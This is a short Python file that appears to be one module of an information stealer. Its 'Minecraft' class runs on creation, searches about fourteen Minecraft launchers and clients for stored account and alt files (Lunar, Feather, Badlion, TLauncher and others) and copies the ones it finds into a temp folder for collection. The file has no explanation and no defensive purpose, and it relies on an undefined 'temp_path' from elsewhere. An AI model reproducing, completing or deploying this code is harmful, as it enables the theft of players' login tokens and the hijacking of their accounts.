import os
from shutil import copy2

class Minecraft:
	def __init__(self):
		self.roaming = os.getenv("appdata")
		self.user_profile = os.getenv("userprofile")
		self.minecraft_paths = {
			"Launcher": os.path.join(self.roaming, ".minecraft", "launcher_accounts.json"),
			"Lunar": os.path.join(self.user_profile, ".lunarclient", "settings", "game", "accounts.json"),
			"TLauncher": os.path.join(self.roaming, ".minecraft", "TlauncherProfiles.json"),
			"Feather": os.path.join(self.roaming, ".feather", "accounts.json"),
			"Meteor": os.path.join(self.roaming, ".minecraft", "meteor-client", "accounts.nbt"),
			"Impact": os.path.join(self.roaming, ".minecraft", "Impact", "alts.json"),
			"Novoline": os.path.join(self.roaming, ".minectaft", "Novoline", "alts.novo"),
			"CheatBreakers": os.path.join(self.roaming, ".minecraft", "cheatbreaker_accounts.json"),
			"Microsoft Store": os.path.join(self.roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
			"Rise": os.path.join(self.roaming, ".minecraft", "Rise", "alts.txt"),
			"Rise (Intent)": os.path.join(self.user_profile, "intentlauncher", "Rise", "alts.txt"),
			"Paladium": os.path.join(self.roaming, "paladium-group", "accounts.json"),
			"PolyMC": os.path.join(self.roaming, "PolyMC", "accounts.json"),
			"Badlion": os.path.join(self.roaming, "Badlion Client", "accounts.json"),
		}

		self.retrieve_minecraft_data()

	def retrieve_minecraft_data(self):
		for name, path in self.minecraft_paths.items():
			if os.path.isfile(path):
				try:
					minecraft_folder = os.path.join(os.path.join(temp_path, "Minecraft"), name)
					os.makedirs(minecraft_folder, exist_ok=True)
					copy2(path, os.path.join(minecraft_folder, os.path.basename(path)))
				except Exception as e:
					print(e)